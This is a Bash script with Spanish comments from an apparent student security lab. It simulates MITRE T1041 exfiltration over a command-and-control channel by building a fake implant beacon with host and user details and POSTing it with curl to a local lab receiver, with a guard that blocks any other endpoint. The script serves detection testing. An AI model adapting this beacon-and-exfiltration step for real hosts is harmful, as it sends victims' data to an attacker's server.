#!/usr/bin/env bash
# ============================================================================
# ATA010 · T1041 Exfiltration Over C2 Channel — ataque MANUAL (TFG, NO de ART)
# ----------------------------------------------------------------------------
# Tecnica : T1041 Exfiltration Over C2 Channel (tactica Exfiltration)
# Fuente  : custom (Atomic Red Team NO tiene pruebas Linux para T1041 -> solo_windows)
# Objetivo: ABRIR un canal de mando y control (C2) hacia el HOST y enviar un
#           beacon (check-in del "implante") por ese canal, simulando la
#           exfiltracion a traves del MISMO canal C2.
#           El canal C2 es el RECEPTOR LOCAL del laboratorio (sink_http.py en el
#           HOST, http://192.168.65.1:9090), reutilizado de ATA008 (D4 opcion A).
# Destino : http://192.168.65.1:9090/c2/beacon
# Ejecuta : desde /home/angel/lab-attack/ATA010 (cwd del ataque -> ancla H4)
# Elevacion: NO (usuario angel). No se instala nada.
#
# ⚠️ REQUISITO: el receptor (Soporte/Ataques/receiver/sink_http.py) debe estar
#    LEVANTADO en el HOST antes de t0 (ver README §9). La prueba de que el beacon
#    SALIO es la linea del `sink.log` con el sha256 del cuerpo.
#
# Prueba de exito (INDEPENDIENTE de la alerta): `sink.log` del HOST con
#   POST /c2/beacon + sha256 coincidente con el del beacon.
# Salida: marcadores T0 / T1_LOCAL en stdout (UTC). t1 OFICIAL tras el scan FIM.
# ============================================================================
set -u

BASE="${HOME}/lab-attack/ATA010"
BEACON="${BASE}/beacon_c2.txt"
HOST="192.168.65.1"
PORT="9090"
ENDPOINT="http://${HOST}:${PORT}/c2/beacon"

echo "ATA010 · T1041 Exfiltration Over C2 Channel (curl beacon) — custom (manual)"
echo "T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# --- precondiciones (fallan ruidosamente, sin tocar nada) ---
if [ ! -d "$BASE" ]; then
  echo "ERROR: no existe $BASE (¿scp del directorio de la tecnica?)" >&2
  exit 1
fi
if ! command -v curl >/dev/null 2>&1; then
  echo "ERROR: curl no disponible (alternativa: bash /dev/tcp, D4-B)" >&2
  exit 1
fi

# cwd determinista = carpeta del ataque (ancla H4 del execve)
cd "$BASE" || { echo "ERROR: no puedo cd a $BASE" >&2; exit 1; }

# GUARDARRAIL: el destino DEBE ser el receptor del laboratorio (VMnet1 del host).
case "$ENDPOINT" in
  "http://192.168.65.1:9090/"*) : ;;
  *) echo "ERROR: endpoint '$ENDPOINT' fuera del receptor del laboratorio (abortado)" >&2; exit 1 ;;
esac

# 0) Semilla determinista del beacon (builtin printf; sin execve).
#    Payload = "check-in" del implante: huella simulada del host comprometido.
if [ ! -f "$BEACON" ]; then
  {
    printf 'id=victima-linux\n'
    printf 'user=angel\n'
    printf 'os=Ubuntu 24.04.5 LTS\n'
    printf 'role=endpoint-finanzas\n'
    printf 'status=ready\n'
  } > "$BEACON"
fi

echo "--- BEACON C2 (sha256) ---"
sha256sum "$BEACON"

# 1) CANAL C2: check-in del implante al endpoint de mando y control (execve de curl)
curl --silent --show-error --max-time 10 \
  --request POST \
  --header 'Content-Type: application/x-www-form-urlencoded' \
  --header 'User-Agent: TFG-C2-Beacon/1.0' \
  --data-binary "@${BEACON}" \
  --output /dev/null \
  --write-out 'HTTP=%{http_code} enviado=%{size_upload}B\n' \
  "$ENDPOINT"

# Convencion tanda B (instrumentacion t0/t1): asentar 1 s para que la marca local
# NO sea degenerada (T1_LOCAL > T0). La ventana OFICIAL [t0,t1] la sella el operador.
sleep 1
echo "T1_LOCAL=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
